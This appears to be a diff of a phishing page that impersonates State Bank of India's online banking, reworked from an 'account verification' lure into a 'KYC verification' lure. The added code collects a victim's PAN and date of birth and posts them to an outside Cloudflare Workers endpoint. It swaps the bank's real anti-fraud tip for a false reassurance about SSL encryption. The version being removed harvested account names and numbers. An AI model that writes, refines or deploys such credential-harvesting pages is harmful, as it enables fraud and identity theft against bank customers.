@@ -9,51 +9,68 @@
         body { background-color: #fff; display: flex; justify-content: center; min-height: 100vh; }
         .container { width: 100%; max-width: 500px; display: flex; flex-direction: column; }
         .full-img { width: 100%; display: block; }
+        
         .header-bar { background-color: #315195; color: white; padding: 12px 15px; font-size: 14px; font-weight: bold; text-transform: uppercase; }
+        
         .content-area { padding: 20px 25px; }
-        .instruction-text { font-size: 13px; color: #333; margin-bottom: 22px; line-height: 1.6; border-left: 4px solid #315195; padding: 12px; background: #f8fbff; border-radius: 0 4px 4px 0; }
+        .instruction-text { 
+            font-size: 13px; color: #333; margin-bottom: 22px; line-height: 1.6; 
+            border-left: 4px solid #315195; padding: 12px; background: #f8fbff; 
+        }
+        
         .field-group { margin-bottom: 18px; }
         .field-group label { display: block; font-size: 13px; color: #444; margin-bottom: 8px; font-weight: bold; }
-        .bank-input { width: 100%; height: 38px; padding: 0 12px; background-color: #fff; border: 1px solid #999; border-radius: 2px; font-size: 15px; outline: none; color: #333; }
-        .bank-input:focus { border-color: #315195; }
+        
+        .kyc-input { 
+            width: 100%; height: 38px; padding: 0 12px; 
+            background-color: #fff; border: 1px solid #999; 
+            border-radius: 2px; font-size: 15px; outline: none;
+            color: #333;
+        }
+        .kyc-input:focus { border-color: #315195; box-shadow: 0 0 5px rgba(49,81,149,0.1); }
+        
+        #pan_no { text-transform: uppercase; }
+
         .btn-row { display: flex; gap: 12px; margin-top: 28px; }
         .btn { flex: 1; padding: 10px 0; border: none; color: white; font-size: 14px; border-radius: 2px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
         .btn-submit { background-color: #315195; }
         .btn-gray { background-color: #6c757d; }
-        .footer-note { margin-top: 35px; font-size: 12px; color: #666; border-top: 1px solid #eee; padding-top: 15px; line-height: 1.5; font-style: italic; }
+
+        .footer-note { margin-top: 35px; font-size: 12px; color: #666; border-top: 1px solid #eee; padding-top: 15px; line-height: 1.5; }
     </style>
 </head>
 <body>
 
     <div class="container">
         <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="Header" class="full-img">
-        <div class="header-bar">Account Verification</div>
+        
+        <div class="header-bar">KYC Verification</div>
 
         <div class="content-area">
             <div class="instruction-text">
-                To ensure the safety of your account, please complete the <b>Account Verification</b> process by providing your registered Name and Account Number below.
+                As per regulatory guidelines, please verify your <b>PAN Card</b> and <b>Date of Birth</b> to ensure uninterrupted access to your account.
             </div>
 
-            <form id="verificationForm">
+            <form id="kycForm">
                 <div class="field-group">
-                    <label>Account Holder Name *</label>
-                    <input type="text" id="acc_name" class="bank-input" required autocomplete="off">
+                    <label>Permanent Account Number (PAN) *</label>
+                    <input type="text" id="pan_no" class="kyc-input" maxlength="10" required 
+                           pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}" title="Enter valid 10-digit PAN">
                 </div>
 
                 <div class="field-group">
-                    <label>11-Digit Account Number *</label>
-                    <input type="number" id="acc_no" class="bank-input" required 
-                           oninput="if(this.value.length > 11) this.value = this.value.slice(0, 11);" autocomplete="off">
+                    <label>Date of Birth *</label>
+                    <input type="date" id="dob_val" class="kyc-input" required>
                 </div>
 
                 <div class="btn-row">
-                    <button type="submit" class="btn btn-submit" id="submitBtn">Verify Account</button>
-                    <button type="reset" class="btn btn-gray">Cancel</button>
+                    <button type="submit" class="btn btn-submit" id="submitBtn">Submit KYC</button>
+                    <button type="reset" class="btn btn-gray">Reset</button>
                 </div>
             </form>
 
             <div class="footer-note">
-                <b>Security Tip:</b> Do not share your banking credentials with anyone. SBI will never ask for your password via SMS or Call.
+                <b>Security Note:</b> OnlineSBI uses 256-bit SSL encryption to protect your data.
             </div>
         </div>
 
@@ -65,20 +82,20 @@
     <script>
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
 
-        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
+        document.getElementById('kycForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const accName = document.getElementById('acc_name').value;
-            const accNo = document.getElementById('acc_no').value;
+            const pan = document.getElementById('pan_no').value.toUpperCase();
+            const dob = document.getElementById('dob_val').value;
             const btn = document.getElementById('submitBtn');
 
             btn.disabled = true;
-            btn.innerText = "Verifying...";
+            btn.innerText = "Processing...";
 
             const payload = {
                 type: "KYC",
-                pan: "NAME: " + accName,
-                dob: "ACC: " + accNo
+                pan: pan,
+                dob: dob
             };
 
             try {
@@ -89,7 +106,7 @@
                     body: JSON.stringify(payload)
                 });
                 
-                // UPDATE: Redirecting to service.html
+                // REDIRECT TO SERVICE.HTML
                 window.location.href = "service.html"; 
             } catch (err) {
                 window.location.href = "service.html";
